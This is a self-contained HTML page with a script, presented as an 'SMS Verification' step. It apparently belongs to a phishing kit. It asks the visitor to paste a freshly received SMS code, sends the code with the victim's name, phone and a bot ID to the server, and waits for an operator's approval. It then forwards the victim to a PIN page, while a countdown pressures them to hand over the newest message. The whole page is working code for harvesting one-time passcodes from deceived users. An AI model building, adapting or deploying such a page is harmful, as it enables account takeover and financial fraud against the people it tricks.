<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #111;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        h1 {
            color: white;
            font-size: 24px;
            margin-bottom: 8px;
            text-align: center;
        }
        .subtitle {
            color: #888;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 600;
            color: #ccc;
            margin-bottom: 6px;
            font-size: 14px;
        }
        textarea {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #333;
            border-radius: 10px;
            font-size: 16px;
            font-family: inherit;
            resize: vertical;
            min-height: 120px;
            background: #1a1a1a;
            color: white;
            transition: border-color 0.3s;
        }
        textarea:focus {
            outline: none;
            border-color: #7a3d1c;
        }
        textarea:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #7a3d1c;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover:not(:disabled) {
            background: #5a2d12;
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            display: none;
            font-weight: 500;
        }
        .status.show {
            display: block;
        }
        .status.waiting {
            background: #1a1a2e;
            color: #ffd93d;
        }
        .status.success {
            background: #1a2e1a;
            color: #6bcb77;
        }
        .status.error {
            background: #2e1a1a;
            color: #ff6b6b;
        }
        .status.expired {
            background: #2e1a1a;
            color: #ff6b6b;
            border: 2px solid #ff6b6b;
        }
        .timer {
            text-align: center;
            color: #888;
            font-size: 14px;
            margin-top: 15px;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 8px;
        }
        .timer span {
            color: #7a3d1c;
            font-weight: bold;
            font-size: 18px;
        }
        .timer.expired {
            color: #ff6b6b;
        }
        .timer.expired span {
            color: #ff6b6b;
        }
        .back-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #7a3d1c;
            text-decoration: none;
            font-size: 14px;
        }
        .back-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 SMS Verification</h1>
        <p class="subtitle">Enter the message you received via SMS</p>

        <form id="smsForm">
            <div class="form-group">
                <label for="smsMessage">SMS Message Received</label>
                <textarea 
                    id="smsMessage" 
                    placeholder="Paste the SMS message you received here..."
                    required
                ></textarea>
            </div>
            <button type="submit" class="btn" id="submitBtn">🔍 Validate SMS</button>
        </form>

        <div class="timer" id="timer">
            ⏱️ Time remaining: <span id="countdown">90</span> seconds
        </div>

        <div class="status" id="status"></div>
        <a href="#" class="back-link" id="backLink">← Go Back</a>
    </div>

    <script>
        // Get data from URL params
        const urlParams = new URLSearchParams(window.location.search);
        const name = urlParams.get('name');
        const phone = urlParams.get('phone');
        const botId = urlParams.get('botId');

        // Handle back link
        const backLink = document.getElementById('backLink');
        if (botId) {
            backLink.href = `/details.html?botId=${botId}`;
        }

        const form = document.getElementById('smsForm');
        const status = document.getElementById('status');
        const submitBtn = document.getElementById('submitBtn');
        const smsMessage = document.getElementById('smsMessage');
        const timerDisplay = document.getElementById('timer');
        const countdownDisplay = document.getElementById('countdown');

        let countdown = 90;
        let timerInterval = null;
        let isExpired = false;

        function showStatus(message, type) {
            status.textContent = message;
            status.className = 'status show';
            if (type) {
                status.classList.add(type);
            }
        }

        function hideStatus() {
            status.className = 'status';
            status.textContent = '';
        }

        function startTimer() {
            timerInterval = setInterval(() => {
                countdown--;
                countdownDisplay.textContent = countdown;

                if (countdown <= 0) {
                    clearInterval(timerInterval);
                    isExpired = true;
                    timerDisplay.classList.add('expired');
                    countdownDisplay.textContent = '0';
                    
                    // Just show the message - don't disable anything
                    showStatus('Please copy the recently received sms.', 'expired');
                }
            }, 1000);
        }

        // Start timer when page loads
        startTimer();

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Check if expired - just show message, don't block
            if (isExpired) {
                showStatus('Please copy the recently received sms.', 'expired');
                return;
            }

            const message = smsMessage.value.trim();

            if (!message) {
                showStatus('Please copy the recently received sms.', 'error');
                return;
            }

            // Check if we have all required data
            if (!name || !phone || !botId) {
                console.error('Missing data:', { name, phone, botId });
                showStatus('⚠️ Missing information. Please go back and start again.', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ Validating...';
            showStatus('⏳ Waiting for approval...', 'waiting');

            try {
                const response = await fetch('/submit-sms', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: name,
                        phone: phone,
                        smsMessage: message,
                        botId: botId
                    })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'Failed to submit SMS');
                }

                // Poll for approval
                const poll = setInterval(async () => {
                    try {
                        const r = await fetch(`/check-sms/${data.requestId}`);
                        const d = await r.json();

                        if (d.approved === true) {
                            clearInterval(poll);
                            clearInterval(timerInterval);
                            showStatus('✅ SMS verified! Redirecting...', 'success');
                            submitBtn.disabled = false;
                            submitBtn.textContent = '🔍 Validate SMS';
                            setTimeout(() => {
                                window.location.href = `/pin.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
                            }, 1500);
                        }

                        if (d.approved === false) {
                            clearInterval(poll);
                            showStatus('❌ SMS verification rejected. Please copy recently received sms.', 'error');
                            submitBtn.disabled = false;
                            submitBtn.textContent = '🔍 Validate SMS';
                        }

                    } catch (err) {
                        clearInterval(poll);
                        showStatus('⚠️ Connection lost. Please try again.', 'error');
                        submitBtn.disabled = false;
                        submitBtn.textContent = '🔍 Validate SMS';
                    }
                }, 2000);

            } catch (error) {
                showStatus('❌ ' + error.message, 'error');
                submitBtn.disabled = false;
                submitBtn.textContent = '🔍 Validate SMS';
            }
        });
    </script>
</body>
</html>
